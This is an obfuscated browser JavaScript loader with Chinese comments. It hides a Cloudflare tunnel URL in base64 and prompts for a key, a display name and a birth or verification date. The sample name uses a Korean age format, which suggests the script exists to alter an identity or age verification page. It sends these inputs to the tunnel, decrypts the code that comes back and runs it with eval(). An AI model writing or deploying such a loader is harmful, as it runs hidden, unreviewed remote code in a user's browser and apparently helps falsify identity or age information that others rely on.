// 浏览器环境的混淆客户端代码
(function(){
  // 服务器地址 - Cloudflare HTTPS
  const _0x1a2b = [
    'aHR0cHM6Ly9mYXZvdXJpdGVzLWNvbHVtbnMtZnQtZXllZC50cnljbG91ZGZsYXJlLmNvbS9hcGkvcGF0Y2g='
  ];
  const _0x3c4d=atob(_0x1a2b[0]);
  
  // 浏览器环境解密函数
  async function _0x5e6f(_0x7g8h,_0x9i0j){
    const [_0xo5p6,_0xq7r8]=_0x7g8h.split(':');
    const _0xs9t0=new Uint8Array(_0xo5p6.match(/.{1,2}/g).map(b=>parseInt(b,16)));
    
    // 使用 PBKDF2 生成密钥
    const _0xu1v2=new TextEncoder().encode(_0x9i0j);
    const _0xw3x4=await crypto.subtle.importKey(
      'raw',_0xu1v2,'PBKDF2',false,['deriveBits']
    );
    
    const _0xy5z6=await crypto.subtle.deriveBits(
      {name:'PBKDF2',salt:new TextEncoder().encode('salt'),iterations:100000,hash:'SHA-256'},
      _0xw3x4,256
    );
    
    const _0xa7b8=await crypto.subtle.importKey(
      'raw',_0xy5z6,{name:'AES-CBC'},false,['decrypt']
    );
    
    const _0xc9d0=new Uint8Array(_0xq7r8.match(/.{1,2}/g).map(b=>parseInt(b,16)));
    const _0xe1f2=await crypto.subtle.decrypt(
      {name:'AES-CBC',iv:_0xs9t0},_0xa7b8,_0xc9d0
    );
    
    return new TextDecoder().decode(_0xe1f2);
  }
  
  // 简单解密备用方案（服务端已调整为Base64）
  function _0xSimpleDecrypt(_0xdata){
    // Base64 -> UTF-8 解码
    function b64ToUtf8(b64){
      return decodeURIComponent(escape(atob(b64)));
    }
    const decoded = b64ToUtf8(_0xdata);
    const marker = '///VALID_CODE///';
    if (decoded.startsWith(marker)) {
      return decoded.substring(marker.length);
    }
    throw new Error('Invalid code format');
  }
  
  // 主函数
  const _0xa1b2=prompt('请输入密钥：');
  if(!_0xa1b2){completion('已取消');return;}
  
  const _0xc3d4=prompt('输入要显示的名字\n示例：ZH** ****AN (만 20세)','ZH** ****AN (만 20세)');
  if(!_0xc3d4){completion('已取消');return;}
  
  const _0xe5f6=prompt('输入生日/认证日期 (YYYY.MM.DD)\n示例：2025.04.06','2025.04.06');
  if(!_0xe5f6){completion('已取消');return;}
  
  // 发送请求
  fetch(_0x3c4d,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      key:_0xa1b2,
      name:_0xc3d4,
      date:_0xe5f6
    })
  })
  .then(_0xg7h8=>_0xg7h8.json())
  .then(async _0xi9j0=>{
    if(_0xi9j0.success){
      try{
        // 尝试使用加密解密
        const _0xk1l2=await _0x5e6f(_0xi9j0.code,_0xa1b2);
        eval(_0xk1l2);
      }catch(e){
        // 备用：使用简单解密
        if(_0xi9j0.simpleCode){
          try {
            const _0xm3n4=_0xSimpleDecrypt(_0xi9j0.simpleCode);
            eval(_0xm3n4);
          } catch(e2) {
            completion('❌ 解密失败：' + e2.message);
          }
        }else{
          completion('❌ 解密失败');
        }
      }
    }else{
      completion('❌ '+(_0xi9j0.error||'请求失败'));
    }
  })
  .catch(_0xm3n4=>{
    completion('❌ 网络错误：'+_0xm3n4.message);
  });
})(); 